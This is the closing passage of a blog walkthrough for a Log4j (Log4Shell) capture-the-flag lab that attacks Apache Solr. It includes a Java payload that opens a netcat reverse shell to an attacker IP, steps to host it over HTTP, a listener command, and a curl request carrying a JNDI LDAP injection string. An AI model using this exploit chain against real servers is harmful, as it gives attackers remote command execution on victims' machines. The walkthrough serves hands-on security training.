<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="kp">public</span> <span class="k">class</span> <span class="nc">Exploit</span> <span class="p">{</span><span class="n">static</span> <span class="p">{</span><span class="n">try</span> <span class="p">{</span> <span class="n">java</span><span class="p">.</span><span class="nf">lang</span><span class="o">.</span><span class="no">Runtime</span><span class="p">.</span><span class="nf">getRuntime</span><span class="p">().</span><span class="nf">exec</span><span class="p">(</span><span class="s2">"nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999"</span><span class="p">);</span> <span class="p">}</span> <span class="kp">catch</span> <span class="p">(</span><span class="no">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span><span class="n">e</span><span class="p">.</span><span class="nf">printStackTrace</span><span class="p">();</span> 
<span class="p">}}}</span> </code></pre></figure>

<p>Compile your payload with</p>
<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">javac</span> <span class="no">Exploit</span><span class="p">.</span><span class="nf">java</span> <span class="o">-</span><span class="n">source</span> <span class="mi">8</span> <span class="o">-</span><span class="n">target</span> <span class="mi">8</span></code></pre></figure>
<p>and verify it succeeded by running the</p>
<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="s1">'ls'</span></code></pre></figure>
<p>command and finding a newly created</p>
<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">Exploit</span><span class="p">.</span><span class="nf">class</span></code></pre></figure>
<p>file</p>

<p>With your payload created and compiled, you can now host it by spinning up a temporary HTTP server.</p>
<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">Python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="nf">server</span> <span class="mi">8000</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="no">Phase</span> <span class="mi">4</span><span class="p">:</span> <span class="no">Exploitation</span></code></pre></figure>

<p>Your payload is created and compiled, it is hosted with an HTTP server in one terminal, your LDAP referral server is up and waiting in another terminal – next prepare a netcat listener to catch your reverse shell in yet another new terminal window: nc -nlvp 9999</p>

<p>Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax! Note the changes in port number (now referring to our LDAP server) and the resource we retrieve, specifying our exploit:</p>

<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby"><span class="n">curl</span> 
<span class="s1">'http://MACHINE_IP:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:138 9/Exploit\}'</span> </code></pre></figure>

<p>You have now received initial access and command-and-control on an Apache Solr instance. This is just one example of many, many vulnerable applications affected by this log4j vulnerability.</p>

<p>At this point, a threat actor can realistically do whatever they would like with the victim – whether it be privilege escalation, exfiltration, install persistence, perform lateral movement or any other postexploitation – potentially dropping cryptocurrency miners, remote access trojans, beacons and implants or even deploying ransomware.<br />
All it took was a single string of text, and a little bit of set up with freely available tooling.</p>

<p>This was precisely why the Internet has been on fire during the weekend of December 9th, 2021.</p>


  </div><a class="u-url" href="/blog-walkthroughs/walkthroughs/2022/01/04/Log4j-THM-Walkthrough.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">Thebyteman</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">Thebyteman</li><li><a class="u-email" href="mailto:thebugcraft@gmail.com">thebugcraft@gmail.com</a></li><li>&copy; Thebyteman 2022</li></ul> 
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.linkedin.com/in/usman-shah-7u7"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#linkedin"></use></svg> <span class="username">usman-shah-7u7</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Welcome to my Blog.  A blog-heaven for all IT Security Lovers, since  you don&#39;t have to read the RFCs because I did.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
